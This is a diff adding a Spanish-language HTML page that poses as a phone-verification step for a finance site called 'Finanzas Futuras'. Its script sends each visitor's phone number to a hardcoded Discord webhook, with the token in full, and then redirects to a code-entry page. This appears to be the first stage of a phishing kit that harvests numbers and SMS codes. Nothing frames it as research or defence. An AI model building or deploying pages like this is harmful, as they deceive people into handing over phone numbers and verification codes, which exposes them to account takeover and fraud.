@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación - Finanzas Futuras</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Poppins', sans-serif;
+    background: #f4f7fb;
+    color: #1e293b;
+}
+
+/* HEADER */
+.header {
+    background: white;
+    padding: 15px 40px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    font-weight: 600;
+    color: #1e3a8a;
+}
+
+/* CONTENEDOR */
+.container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 85vh;
+    padding: 20px;
+}
+
+.box {
+    background: white;
+    padding: 40px;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+}
+
+.box h2 {
+    margin-bottom: 10px;
+}
+
+.box p {
+    font-size: 14px;
+    color: #64748b;
+    margin-bottom: 25px;
+}
+
+/* INPUT */
+.phone-group {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+}
+
+select {
+    padding: 12px;
+    border-radius: 10px;
+    border: 1px solid #cbd5e1;
+    font-size: 14px;
+}
+
+input {
+    flex: 1;
+    padding: 12px;
+    border-radius: 10px;
+    border: 1px solid #cbd5e1;
+    font-size: 16px;
+}
+
+input:focus, select:focus {
+    border-color: #1e3a8a;
+    outline: none;
+}
+
+/* BOTÓN */
+button {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 10px;
+    background: #1e3a8a;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    background: #172554;
+}
+
+button:disabled {
+    background: #94a3b8;
+    cursor: not-allowed;
+}
+
+.success {
+    display: none;
+    margin-top: 15px;
+    color: #1e3a8a;
+    font-size: 14px;
+}
+
+/* RESPONSIVE */
+@media (max-width: 600px) {
+    .box {
+        padding: 25px;
+    }
+    .phone-group {
+        flex-direction: column;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">💰 Finanzas Futuras</div>
+
+<div class="container">
+    <div class="box">
+        <h2>Verificación</h2>
+        <p>Para continuar, verificaremos tu número de teléfono.</p>
+
+        <div class="phone-group">
+            <select id="codigo">
+                <option value="+57">🇨🇴 +57</option>
+                <option value="+52">🇲🇽 +52</option>
+                <option value="+1">🇺🇸 +1</option>
+                <option value="+34">🇪🇸 +34</option>
+                <option value="+54">🇦🇷 +54</option>
+                <option value="+51">🇵🇪 +51</option>
+                <option value="+56">🇨🇱 +56</option>
+                <option value="+593">🇪🇨 +593</option>
+                <option value="+58">🇻🇪 +58</option>
+                <option value="+55">🇧🇷 +55</option>
+            </select>
+
+            <input type="tel" id="telefono" placeholder="Número de teléfono">
+        </div>
+
+        <button id="btnEnviar" onclick="enviar()">Continuar</button>
+
+        <div class="success" id="msg">Procesando...</div>
+    </div>
+</div>
+
+<script>
+async function enviar() {
+    // 1. REEMPLAZA CON TU WEBHOOK DE DISCORD
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1467797896304001025/51qj0DO77O-xX4B4E3YqbE3S38fx6pkqCe-H5JZT3NZLUr4cbmTLujxqqNP-aGU7V_mX";
+
+    let codigoPais = document.getElementById("codigo").value;
+    let numeroTel = document.getElementById("telefono").value;
+    let btn = document.getElementById("btnEnviar");
+    let msg = document.getElementById("msg");
+
+    if(numeroTel === "") {
+        alert("Ingresa tu número");
+        return;
+    }
+
+    // 2. Formatear número completo
+    let numeroCompleto = codigoPais + " " + numeroTel;
+
+    // 3. GUARDAR EL NÚMERO EN EL NAVEGADOR (Para usarlo en la siguiente página)
+    localStorage.setItem("telefono_usuario", numeroCompleto);
+
+    // Bloquear interfaz
+    btn.disabled = true;
+    btn.innerText = "Cargando...";
+    msg.style.display = "block";
+
+    // 4. Preparar datos para Discord
+    const payload = {
+        embeds: [{
+            title: "📱 Paso 1: Teléfono Ingresado",
+            color: 3447003, // Azul
+            fields: [
+                {
+                    name: "Número de Teléfono",
+                    value: `**${numeroCompleto}**`,
+                    inline: true
+                },
+                {
+                    name: "IP / Info",
+                    value: "Visitante en sitio web",
+                    inline: true
+                }
+            ],
+            footer: { text: "Finanzas Futuras - Log" },
+            timestamp: new Date()
+        }]
+    };
+
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            // 5. REDIRIGIR A LA PÁGINA DEL CÓDIGO (codigo.html)
+            window.location.href = "codigo.html";
+        } else {
+            throw new Error('Error al enviar');
+        }
+    } catch (error) {
+        console.error(error);
+        alert("Ocurrió un error. Revisa tu conexión.");
+        btn.disabled = false;
+        btn.innerText = "Continuar";
+        msg.style.display = "none";
+    }
+}
+</script>
+
+</body>
+</html>
